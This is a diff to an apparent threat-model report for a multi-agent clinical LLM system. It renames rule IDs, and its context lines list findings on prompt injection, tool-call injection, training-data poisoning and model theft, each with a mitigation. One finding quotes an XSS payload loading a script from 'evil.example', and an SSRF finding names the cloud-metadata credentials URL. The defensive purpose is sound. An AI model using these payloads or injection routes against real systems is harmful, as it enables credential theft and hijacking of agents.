@@ -142,7 +142,7 @@
               }
             },
             {
-              "id": "tachi/ai/agentic-threats",
+              "id": "tachi/ai/agentic",
               "name": "Agentic Threats",
               "shortDescription": {
                 "text": "AI agent autonomy and multi-agent coordination threats"
@@ -160,7 +160,7 @@
               }
             },
             {
-              "id": "tachi/ai/llm-threats",
+              "id": "tachi/ai/llm",
               "name": "LLM Threats",
               "shortDescription": {
                 "text": "Large language model specific threats"
@@ -314,7 +314,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "Prompt injection causes the Orchestrator to autonomously execute unauthorized high-impact actions (mass data exfiltration from KB, bulk tool invocations against External API) beyond the scope of the user's original request, exploiting the Orchestrator's broad access to system capabilities.",
             "markdown": "Implement a scope-enforcement layer: the Orchestrator MUST validate every proposed action against the user session's permitted scope before execution. Apply human-in-the-loop confirmation for high-impact operations (bulk exports, external writes). Use a supervised-autonomy model: the Orchestrator proposes an action plan; a separate policy engine approves or rejects it."
@@ -512,7 +512,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — server-side execution via Tool Call Request: LLM-generated JSON-RPC parameters flowing into the MCP Tool Server may contain injection payloads (SQL fragments, shell metacharacters) that are executed server-side when the Tool Server dispatches tool invocations. Execution context is **server-side**: the payload runs on the Tool Server with its service account credentials and external API access.",
             "markdown": "The MCP Tool Server MUST validate and parameterize all LLM-supplied tool arguments before execution: use parameterized queries for database tools, argument vectors (not shell interpolation) for command tools, and URL allowlisting for HTTP tools. Never pass LLM output directly to an execution sink — treat it as untrusted input at every downstream execution point."
@@ -561,7 +561,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — server-side execution via Tool Call Request: the Orchestrator emits \"Tool Call Request (JSON-RPC)\" messages to the MCP Tool Server containing LLM-synthesized parameters. If tool parameters are used to construct SQL queries, shell commands, template expressions, or filesystem paths server-side without parameterization or sanitization, an attacker who influences the Orchestrator's output achieves **server-side code/command execution** via the tool execution sink. Execution context: Tool Server backend, with service account credentials and External API access. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server = server-side execution sink.",
             "markdown": "MCP Tool Server MUST parameterize all LLM-supplied inputs: use `cursor.execute(sql, params)` (not string interpolation) for SQL tools; `subprocess.run([cmd, arg1], shell=False)` for command tools; validate against a closed allowlist for enumerable parameters (tool names, resource identifiers). Implement a JSON Schema validator at the Tool Server ingress that rejects any request failing parameter type/format constraints before dispatch."
@@ -623,7 +623,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — client-side XSS via...",
             "markdown": ""
@@ -672,7 +672,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — client-side XSS via LLM response rendered in user browser: the Orchestrator's \"Response (HTTPS)\" data flow sends LLM-generated content directly to the User. If the client-side rendering layer injects this content into the DOM via `innerHTML` or equivalent without HTML entity encoding, an attacker who primes the Orchestrator to emit `<script src=\"//evil.example/steal.js\">` or an event-handler payload causes **client-side execution** in the victim's browser under the application's origin, with access to session cookies, CSRF tokens, and downstream user-authenticated APIs. This is a direct output-sink path: LLM Process → `Response (HTTPS)` → User browser render surface. FR-011 two-part gate confirmed: (1) LLM keyword on LLM Agent Orchestrator, (2) `Response (HTTPS)` data flow into User (browser render surface = client-side execution sink).",
             "markdown": "Use `textContent` (not `innerHTML`) for all LLM response insertion into the DOM. If HTML rendering is required, pass model output through a strict HTML sanitization library (DOMPurify configured with `FORCE_BODY: true`, allowlist elements only). Deploy a Content Security Policy with `script-src 'self' 'nonce-<nonce>'` and no `unsafe-inline`. Do NOT rely on server-side filtering alone — apply encoding at each render point independently."
@@ -729,7 +729,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Prompt injection via clinical query context: the Clinical Advisory Sub-Agent processes Clinical Query / Context payloads from the Orchestrator. If the clinical context contains adversarially crafted text (injected via the original user prompt, via adversarial KB documents retrieved upstream, or via a compromised Orchestrator), the injection can override the sub-agent's system prompt, cause it to fabricate clinical recommendations, reveal its system configuration, or escalate privileges within the advisory pipeline.",
             "markdown": "Apply instruction-boundary enforcement at the Clinical Advisory Sub-Agent: the sub-agent's system prompt MUST be in a protected zone inaccessible to clinical query content from the Orchestrator. Implement clinical-query content sanitization: strip instruction-like patterns before context injection into the sub-agent. Apply output validation on the sub-agent's clinical summaries to detect system-prompt leakage or anomalous clinical claims."
@@ -778,7 +778,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Prompt injection via delegation messages: the Specialist Agent processes tasks delegated by the Orchestrator via the Inter-Agent Channel. An attacker who injects adversarial content into the Delegation Message (via channel tampering or Orchestrator compromise) can hijack the Specialist's task execution, causing it to perform unauthorized tool invocations or exfiltrate data through its result channel.",
             "markdown": "Apply prompt injection detection at the Specialist Agent's input processing layer: treat all delegation message content as untrusted data, not instructions. Implement instruction boundary enforcement: the Specialist's system prompt must be in a protected zone inaccessible to delegation message content. Verify delegation message signatures before processing."
@@ -876,7 +876,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Direct prompt injection via the User→Guardrails→Orchestrator chain: an attacker embeds adversarial instructions in the user's prompt that the Guardrails Service fails to detect, causing the Orchestrator to override its system prompt, reveal internal configuration, or execute unauthorized actions.",
             "markdown": "Implement multi-layer prompt injection detection: (1) Guardrails content filtering, (2) Orchestrator-level instruction boundary enforcement (treat user content as data, not instructions), (3) output validation that checks responses for system-prompt leakage patterns. Use a privilege-separated prompt architecture (system prompt in a protected zone inaccessible to user content)."
@@ -926,7 +926,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Training data poisoning via the Long-Running Learning Loop: the Orchestrator ingests model updates from the Learning Loop that was trained on audit log data. An attacker who pollutes the audit log with adversarial interaction records (fabricated user sessions designed to shift model behavior) poisons the Orchestrator's future behavior at update time.",
             "markdown": "Apply training data validation: audit all training data before use with anomaly detection, data-quality checks, and outlier filtering. Implement data provenance tracking — every training example must carry a verifiable source signature. Apply adversarial training detection: scan for data patterns designed to shift model outputs toward specific adversarial objectives."
@@ -1123,7 +1123,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "The MCP Tool Server is vulnerable to tool call injection: an attacker who can influence the LLM output of either the Orchestrator or Specialist Agent can inject crafted JSON-RPC parameters that invoke unintended tools (tool name injection) or supply malicious arguments to permitted tools (parameter injection). The Tool Server executes these with its own service credentials.",
             "markdown": "Implement strict tool call validation: (a) validate the tool name against a registered allowlist, (b) validate each parameter against a per-tool JSON Schema, (c) reject any request that fails validation before execution. Apply parameter encoding for values that will be forwarded to external systems (URLs, SQL fragments, shell arguments)."
@@ -1270,7 +1270,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Indirect prompt injection via the Knowledge Base: an attacker embeds adversarial instructions in documents stored in the Knowledge Base. When the Orchestrator retrieves these documents during vector search, the adversarial instructions are injected into its context window, hijacking its reasoning.",
             "markdown": "Apply retrieval-time content sanitization: strip or neutralize instruction-like patterns from retrieved documents before injection into the Orchestrator's context window. Implement a separate \"content auditor\" that evaluates retrieved documents for prompt injection patterns. Apply context segmentation: mark retrieved content as \"untrusted data\" in the context window structure so the model treats it differently from trusted instructions."
@@ -1368,7 +1368,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — SSRF via LLM-synthesized URL: the Orchestrator can instruct the MCP Tool Server to fetch external URLs synthesized from LLM output. An attacker who influences the Orchestrator's output can cause it to emit internal service URLs (cloud metadata endpoints, internal admin APIs) as tool parameters. The Tool Server fetches these with its server-side network credentials. Execution context is **server-side**: the HTTP client runs with the Tool Server's IAM role.",
             "markdown": "Implement URL allowlisting on all outbound HTTP tool invocations in the MCP Tool Server. Reject any URL not matching an explicit allowlist of permitted external hostnames. Block egress to RFC 1918 ranges, link-local, and cloud metadata endpoints via egress firewall. Validate URL scheme against `{http, https}` only. Apply DNS pinning."
@@ -1417,7 +1417,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Training data poisoning of the Clinical Advisory Sub-Agent via the Learning Loop: Clinical Decision Log Entries from the sub-agent are included in the Audit Logger training stream. An attacker who injects adversarially crafted clinical interaction records into the Audit Logger can shift the sub-agent's clinical reasoning toward attacker-preferred outputs — for example, consistently recommending specific drugs, understating contraindications, or omitting standard-of-care steps in returned clinical summaries.",
             "markdown": "Apply Clinical Decision Log Entry provenance attestation: each log entry from the Clinical Advisory Sub-Agent must carry a verifiable origin signature. Implement anomaly detection specifically for clinical training signals — monitor for unusual shifts in diagnostic terms, drug recommendation patterns, or contraindication omission rates. Apply a clinical-domain holdout evaluation suite before deploying any model update to the ClinAdvisor: compare pre/post-update clinical recommendations against a reference set of clinically-validated cases."
@@ -1467,7 +1467,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "**Overreliance / Missing HITL on Decision-Critical Output (Category 3 per FR-017)**: The Clinical Advisory Sub-Agent's \"Clinical Summary + Recommendations\" output flows directly back to the LLM Agent Orchestrator and from there into the user-facing response path without a declared human-in-the-loop (HITL) review gate. Clinical recommendations generated by the sub-agent — including potential drug choices, contraindication assessments, and diagnostic interpretations — surface to the end consumer (clinician, patient, downstream system) as Orchestrator-mediated output without requiring physician sign-off, clinical review confirmation, or AI-provenance disclosure.",
             "markdown": "Implement a mandatory HITL physician sign-off gate before clinical advisory outputs surface in any patient-facing or decision-critical context. Route the Clinical Advisory Sub-Agent's output through a clinical review workflow: outputs above a defined risk threshold (any recommendation about drug dosing, contraindications, or diagnoses) MUST require physician confirmation before inclusion in user-facing responses. Apply AI-provenance disclosure on every surfaced clinical recommendation."
@@ -1573,7 +1573,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — server-side injection via tool call results: the Specialist Agent's tool call results from MCP Tool Server are incorporated into its context and may influence downstream tool invocations. If the Tool Server returns LLM-influenced content that contains injection payloads, the Specialist's next tool call may forward those payloads to execution sinks. Execution context is **server-side**.",
             "markdown": "Implement output sanitization on all tool results before incorporating them into the Specialist's context window for subsequent tool invocations. Treat tool results as untrusted data inputs — never interpolate them directly into subsequent tool call parameters without validation. Apply allowlist-based parameter validation at the Tool Server for all tool inputs regardless of source."
@@ -1622,7 +1622,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "**Ungrounded Factual Emission (Category 1 per FR-017)**: The Clinical Advisory Sub-Agent emits clinical summaries containing factual medical claims (diagnostic observations, drug-interaction assertions, clinical recommendations) to the Orchestrator's response path without mandatory RAG grounding against a verified EHR index. Although the sub-agent retrieves documents from the Knowledge Base via vector search, there is no declared retrieval-strength metric (hit-rate or recall@k), no per-claim source anchoring that traces each clinical assertion to a specific retrieved document section, and no output-time verification that factual claims are supported by retrieved content. A hallucinated clinical assertion (fabricated drug dose, fabricated contraindication, fabricated diagnostic criterion) that reaches a clinician or downstream decision system under time pressure may drive a clinical action the recipient would not otherwise take.",
             "markdown": "Require mandatory RAG grounding with per-claim source anchoring: each factual claim in the clinical summary output MUST cite a retrievable Knowledge Base document section. Expose per-claim retrieval-strength metadata (hit-rate or recall@k) alongside the output; reject clinical outputs where retrieval strength falls below a defined threshold. Implement a clinical output validator that checks each factual assertion against the retrieved document set before returning the summary to the Orchestrator."
@@ -1679,7 +1679,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "**Retrieval-Grounding Gap (Category 4 per FR-017)**: The Clinical Advisory Sub-Agent performs vector search against the Knowledge Base to retrieve supporting clinical documents. However, there is no declared mechanism to detect or handle retrieval failures — scenarios where the Knowledge Base does not contain documents relevant to the clinical query (low-recall retrieval, out-of-distribution queries, stale KB content). In these cases, the sub-agent may fabricate plausible-sounding clinical content to fill the gap, presenting hallucinated information with the same confidence as retrieval-grounded claims.",
             "markdown": "Implement a retrieval-quality gate: before generating a clinical summary, the sub-agent MUST evaluate retrieval quality metrics (recall@k, minimum hit-score threshold). If retrieval quality falls below the threshold, the sub-agent MUST return a structured \"insufficient grounding\" response rather than a speculative clinical summary. Apply a retrieval-quality confidence indicator on all outputs; apply Knowledge Base currency monitoring."
@@ -1736,7 +1736,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — SSRF via LLM-synthesized URL in Tool Call Request: the Orchestrator constructs \"Tool Call Request (JSON-RPC)\" messages containing URLs sourced from LLM output (e.g., \"fetch this URL\" tool calls). The MCP Tool Server executes outbound HTTP to the supplied URL using its own server-side network credentials and IAM role. An attacker who influences the Orchestrator's output can cause it to emit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or RFC 1918 internal service URLs. Execution context is **server-side**: the HTTP client runs with the Tool Server's IAM role and internal network reach. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server → External API (HTTP fetch) = SSRF-capable server-side execution sink.",
             "markdown": "Implement URL allowlisting on the MCP Tool Server for all outbound HTTP tool invocations: reject any URL not in an explicit allowlist of permitted external hostnames. Block egress to RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), and cloud metadata endpoints via egress firewall rules. Validate URL scheme to `{http, https}` only. Apply DNS pinning (resolve once, verify IP is not private before dispatch)."
@@ -1989,7 +1989,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "The Specialist Agent, once delegated a task, operates autonomously without continuous Orchestrator oversight. An adversarially crafted delegation message can cause the Specialist to execute a sequence of tool calls that constitutes a prohibited action when viewed holistically — each individual call appears permitted, but the combination achieves an unauthorized outcome.",
             "markdown": "Implement task-level intent verification: the Specialist MUST check that each tool invocation in a task sequence is consistent with the task's stated objective. Apply a \"budget\" on tool calls per task (maximum N calls); require re-authorization from the Orchestrator for task extensions. Log all tool call sequences for retrospective analysis."
@@ -2038,7 +2038,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "The MCP Tool Server acts as a privileged execution broker. Runaway or adversarially prompted agents (Orchestrator or Specialist) can cause the Tool Server to repeatedly call External API endpoints in rapid succession, exhausting the API provider's rate limits, incurring financial costs, or triggering security lockouts that deny the system access to required external capabilities.",
             "markdown": "Implement per-session and per-agent tool call budgets with hard rate limits enforced at the Tool Server (not just the agent). Apply per-tool circuit breakers: if a tool's error rate exceeds a threshold, temporarily disable it and alert operators. Monitor cumulative external API spend and alert on anomalous patterns."
@@ -2186,7 +2186,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Improper output handling — server-side execution via Clinical Query / Context injection into the Orchestrator's downstream Tool Call Request: the Clinical Advisory Sub-Agent returns \"Clinical Summary + Recommendations\" to the Orchestrator via JSON-RPC. If the Orchestrator incorporates this clinical output into a subsequent Tool Call Request (JSON-RPC) to the MCP Tool Server without sanitization (e.g., embedding clinical recommendation text into a tool parameter), adversarial content injected into the clinical output can achieve server-side execution at the Tool Server. Execution context: **server-side** via the Orchestrator→ToolServer path. FR-011 two-part gate confirmed: (1) LLM keyword on Clinical Advisory Sub-Agent (\"clinical\", \"advisory\", \"medical\"), (2) `Clinical Summary + Recommendations` → Orchestrator → `Tool Call Request (JSON-RPC)` → MCP Tool Server = server-side execution sink downstream of sub-agent output.",
             "markdown": "The Orchestrator MUST treat Clinical Advisory Sub-Agent outputs as untrusted inputs when constructing downstream Tool Call Requests: apply output sanitization and allowlist-based parameter validation before incorporating clinical recommendation text into JSON-RPC parameters. Never interpolate raw clinical output directly into tool invocation parameters. Apply the same parameterization and schema-validation controls as for direct LLM output (OI-2 mitigations)."
@@ -2346,7 +2346,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "The Orchestrator and Specialist Agent can jointly coordinate (via the Inter-Agent Channel) to achieve a combined action that neither could perform alone or that would trigger per-agent rate limits if attempted individually. An attacker who compromises both agents (or injects coordinated prompts via the Inter-Agent Channel) can leverage this coordination for policy circumvention or joint data exfiltration.",
             "markdown": "Implement cross-agent rate limits and coordination throttles at the Channel level. Log all inter-agent coordination patterns to the Audit Logger. Apply a policy engine that evaluates the combined effect of multi-agent action sequences. Enforce per-agent AND per-session action budgets independently."
@@ -2395,7 +2395,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "The Channel is a shared substrate whose compromise enables agent-in-the-middle attacks: an attacker intercepts delegation messages, modifies the task parameters (replacing legitimate tool targets with attacker-controlled endpoints), and forwards the modified message to the Specialist Agent. The Specialist executes unauthorized actions believing the instructions came from the Orchestrator.",
             "markdown": "Implement end-to-end message authentication with digital signatures (Orchestrator signs, Specialist verifies). The Channel itself MUST NOT be trusted for integrity — security MUST be at the message level. Implement replay detection (monotonic message counters, timestamp windows)."
@@ -2836,7 +2836,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "The Learning Loop's model update mechanism, when fed adversarially crafted training signals, can be exploited for a temporal autonomy attack: the training data contains instructions that cause the updated model to expand its autonomous action scope on the next cycle, gradually accumulating capabilities it was not originally authorized to have.",
             "markdown": "Apply capability auditing as part of every model update evaluation: before deploying an update, run the updated model through a capability regression suite that tests for unauthorized capability expansion. Enforce a strict capability allowlist (permitted tool types, action categories) that is evaluated post-update and MUST pass before production deployment of any model update."
@@ -2934,7 +2934,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Training data poisoning of the Specialist Agent via the Learning Loop: adversarially crafted audit log entries from the Specialist's own decision logs (self-poisoning) can be incorporated into the Learning Loop's training signal and returned as a model update that shifts the Specialist's behavior toward attacker-preferred outputs.",
             "markdown": "Apply the same training data provenance and anomaly detection controls as LLM-4. Additionally: implement agent-specific behavioral baselining — compare the Specialist's pre/post-update behavior against its baseline on a held-out evaluation set before deploying any update."
@@ -3032,7 +3032,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Data poisoning of the Learning Loop's training signal: the audit log training stream is the Learning Loop's primary data source. An attacker who systematically injects adversarially crafted interaction records into the Audit Logger creates poisoned training data that shifts the updated models' behavior over the training cycle — a temporal data poisoning attack with delayed activation at the next model update.",
             "markdown": "Implement training data integrity controls: (a) cryptographic signing of each audit log batch, (b) anomaly detection on training signal distributions (outlier detection, behavioral drift analysis), (c) holdout evaluation before deploying any update, (d) differential privacy during training to limit per-example influence. Apply a human-review gate on model updates that show significant behavioral deviation from the prior version."
@@ -3278,7 +3278,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "**Insecure Inter-Agent Communication (Category 9 — OWASP ASI07:2026)**: The Inter-Agent Communication Channel connects the LLM Agent Orchestrator, Specialist Agent, and (via the Orchestrator) the Clinical Advisory Sub-Agent without declaring mutual authentication, inter-agent message signing, or nonce-based replay prevention. The channel does not declare mTLS between senders and receivers, messages lack HMAC envelope signatures or asymmetric envelope signatures (Ed25519 / ECDSA), and no timestamp-bound nonce-based replay-window enforcement is documented. A network-positioned attacker or a compromised Application Zone process can intercept delegation messages (AML.T0060 agent-in-the-middle topology) and replay, modify, or inject instructions to the Specialist Agent or the Orchestrator without any authentic-source signal available to the receiving component. The Orchestrator additionally acts as a relay between the Channel and the Clinical Advisory Sub-Agent without declared taint propagation — the relay's outputs do not carry the upstream sender's authority labels, enabling an attacker who compromises the Orchestrator's relay function to propagate attacker-controlled content to ClinAdvisor without the authority label that ClinAdvisor would need to detect tampering.",
             "markdown": "(1) Mutual TLS (mTLS) — pinned client/server certificates with mutual verification on every inter-agent channel endpoint; reject any channel without declared mTLS at trust-boundary crossings. (2) Inter-agent message signing — HMAC envelope signing (HMAC-SHA256) or asymmetric envelope signature (Ed25519) with integrity verification at the receiving agent BEFORE any action is taken on the message. (3) Nonce-based replay prevention — bounded message-age window enforced with a monotonic counter or timestamp + per-call nonce; receiving agents MUST reject messages outside the replay window. (4) Inter-agent taint labels — authority propagation across the Orchestrator relay: the relay's outputs MUST carry the upstream sender's authority labels so ClinAdvisor and Specialist can detect tampering at the receiving end. (5) Per-channel mutual authentication fallback — mutual JWT or mutual API key as fallback where mTLS is infeasible, validated peer-to-peer at every channel handshake."
@@ -3545,7 +3545,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Model theft via systematic API probing: an attacker issues carefully crafted queries to extract the Orchestrator's model behavior, fine-tuning data characteristics, or system prompt contents through systematic probing, enabling the attacker to build a functional replica of the model or extract proprietary training data.",
             "markdown": "Implement query rate limiting and anomaly detection to identify systematic probing patterns (similar query structures, exhaustive parameter sweeps). Apply differential privacy to training data to limit memorization. Add output perturbation or watermarking to model responses to enable detection of model-extraction datasets. Limit response detail for queries that pattern-match against known extraction techniques."
@@ -3594,7 +3594,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/llm-threats",
+          "ruleId": "tachi/ai/llm",
           "message": {
             "text": "Model theft via Learning Loop output monitoring: an attacker with observability access to the Learning Loop's model update artifacts (parameter diffs, update packages) can reconstruct the model's architecture, parameters, or training data characteristics — effectively stealing the proprietary model.",
             "markdown": "Encrypt model update packages end-to-end: the Learning Loop MUST encrypt model artifacts before emission; the Orchestrator and Specialist decrypt using HSM-managed keys. Apply model watermarking to enable theft detection. Restrict access to model update artifacts to authorized deployment services only."
@@ -3937,7 +3937,7 @@
           }
         },
         {
-          "ruleId": "tachi/ai/agentic-threats",
+          "ruleId": "tachi/ai/agentic",
           "message": {
             "text": "Multi-agent emergent behavior — cascading failu...",
             "markdown": ""
